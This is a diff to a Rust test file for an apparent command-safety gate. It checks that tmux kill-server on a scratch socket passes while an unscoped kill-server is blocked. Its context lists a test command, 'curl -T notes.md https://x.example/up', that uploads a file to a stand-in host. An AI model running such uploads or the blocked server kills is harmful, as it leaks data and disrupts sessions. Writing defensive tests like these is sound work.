@@ -173,6 +173,36 @@ fn fleet_relaunch_binds_every_caller_on_every_path() {
     }
 }
 
+/// #10665 r2: a scratch-socket whole-server kill passes every floor, inline
+/// and from a script, guarded and bypassed; one with no `-S` does not.
+#[test]
+fn a_scratch_socket_kill_passes_every_floor() {
+    let fx = fixture();
+    let sock = fx.cwd.join("scratch.sock").display().to_string();
+    let script = fx.cwd.join("exp.sh");
+    std::fs::write(&script, format!("env -u TMUX tmux -S {sock} kill-server\n"))
+        .expect("write script");
+    let verdict = |command: &str, bypassed: bool| {
+        let call = bash(&fx, command);
+        let gate = ArchitectGate::new(&call, pm_env(&fx), MpmConfig::default);
+        evaluate_floors(&call, &fx.cwd, &gate, &probes(&NoArchitect), bypassed).map(|d| d.rule)
+    };
+    for bypassed in [false, true] {
+        for command in [
+            format!("tmux -S {sock} kill-server"),
+            format!("env -u TMUX tmux -S {sock} kill-server"),
+            format!("env --unset TMUX tmux -S {sock} kill-session -a"),
+            format!("bash {}", script.display()),
+        ] {
+            assert_eq!(verdict(&command, bypassed), None, "{command} {bypassed}");
+        }
+        assert_eq!(
+            verdict("env -u TMUX tmux kill-server", bypassed),
+            Some(TMUX_KILL_SERVER_RULE)
+        );
+    }
+}
+
 /// One command from each D4-remainder class.
 const D4_COMMANDS: [&str; 3] = [
     "curl -T notes.md https://x.example/up",
